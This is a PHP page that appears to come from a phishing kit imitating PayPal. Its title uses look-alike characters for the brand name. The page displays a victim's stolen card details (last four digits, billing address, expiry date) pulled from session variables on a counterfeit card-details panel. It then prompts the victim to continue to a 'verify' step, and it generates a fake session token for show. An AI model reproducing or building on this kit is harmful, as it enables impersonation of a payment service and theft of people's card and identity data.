<?php
session_start();
error_reporting(0);
if(isset($_SESSION['Brand'] )) { 
if ( $_SESSION['Brand'] == "AMERICAN EXPRESS") { $type = "amex";}
if ( $_SESSION['Brand'] == "JCB") { $type = "jcb";}
if ( $_SESSION['Brand'] == "DINERS_CLUB") { $type = "Diners club";}
if ( $_SESSION['Brand'] == "DINERS_CLUB_GLOBAL") { $$type = "Diners club";}
if ( $_SESSION['Brand'] == "VISA") { $type = "visa";}
if ( $_SESSION['Brand'] == "VISA ELECTRON") { $type = "visa";}
if ( $_SESSION['Brand'] == "MASTERCARD") { $type = "master_card";}
if ( $_SESSION['Brand'] == "MAESTRO") { $type = "maestro";}
if ( $_SESSION['Brand'] == "DISCOVER") { $type = "discover";}
}
if ( $_SESSION['category'] == "GOLD" || $_SESSION['category'] == "PREMIER" ) { $color = "gold";}
elseif ( $_SESSION['category'] == "PLATINUM"|| $_SESSION['category'] == "GRAY") { $color = "gray";}
elseif ( $_SESSION['category'] == "GREEN"|| $_SESSION['category'] == "CORPORATE") { $color = "green";}
elseif ( $_SESSION['category'] == "PREMIUM"|| $_SESSION['category'] == "WORLD CARD" || $_SESSION['category'] == "BLACK") { $color = "black";}
elseif ($_SESSION['category'] == "BLUE CASH" || $_SESSION['category'] == "BLUE" ||  $_SESSION['category'] == "BLUE FOR BUSINESS" || $_SESSION['category'] == "BLUE AIRMILES CASH BACK CARD" ||  $_SESSION['category'] == "BLUE SKY" ||  $_SESSION['category'] == "CORP. PURCHASING CARD") { $color = "blue"; }
elseif ( $_SESSION['category'] == "RED"){$color="red";}
else{
	($color="gray");
}
$token = "cmd=_session=".$_SESSION['code_cn']."&".md5(microtime())."&dispatch=".sha1(microtime())."";
?>
<html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" type="text/css" href="../files/css/ap.css">
<link rel="stylesheet" type="text/css" href="../files/css/app.ltr.css">
<style type="text/css">
	.href{color: #0070ba;font-weight: 300;}
	.href:hover{color: #0070ba;font-weight: 300;}
	.href:focus{color: #0070ba;font-weight: 300;}
</style>
<link rel="shortcut icon" type="image/x-icon" href="../files/img/favicon.ico">
<title>ΡаyΡаI <? echo($language['bar'][4]) ?></title>
<body style="background-color: #fff;" > 
<section style="outline: 0;background: #fff" tabindex="-1" class="animated med fadeInUpBig" role="dialog" aria-labelledby="overpanel-header" aria-hidden="false"></div><div class=" overpanel-content maxOverpanelWidth" style="overflow: visible;" role="document"><div id="overpanel-header" class=" overpanel-header">
<h2 style="font-size: 2em;" id="overpanel-header"><? echo($language['details'][1]) ?></h2><br>
</div><div class=" overpanel-body"><div class="menu col-sm-6"><div class="creditOrDebit <?php echo "$type"; ?> <? echo "$color"; ?> card image"><span class="lastDigits vx_text-3" dir="ltr">XXXX-XXXX-XXXX-<span class="last4"><?=substr($_SESSION['ccnum'] ,-4);?></span></span>

<span class="ribbon ready animated med"><span class="ribbonBadge1 needAttention" style=""><? echo($language['details'][4]) ?></span></div>

<p>
<a style="cursor: pointer;" onclick="window.location.href='./verify';return false;" class="jsInitiateConfirmation href" name="initiateConfirmation"><? echo($language['details'][5]) ?></a>

</p></div><div class="cardSummary col-sm-6" aria-labelledby="overpanel-subheader"><dl><dt class="billingLabel"><? echo($language['details'][2]) ?></dt><dd class="addressDisplay" style="width: 70%"><div class="address" style="text-transform: capitalize;"><div style="text-transform: uppercase;"><? echo $_SESSION['address']; ?></div></div></dd><dt class="expirationLabel"><? echo($language['details'][3]) ?></dt><dd class="cobrowse_mask"><? echo $_SESSION['expdate']; ?></dd></dl></span></div></div><div class="row"><div class="col-md-12 tooltipContent"><div class="header"></div></div></div></div></section>
</body>
</html>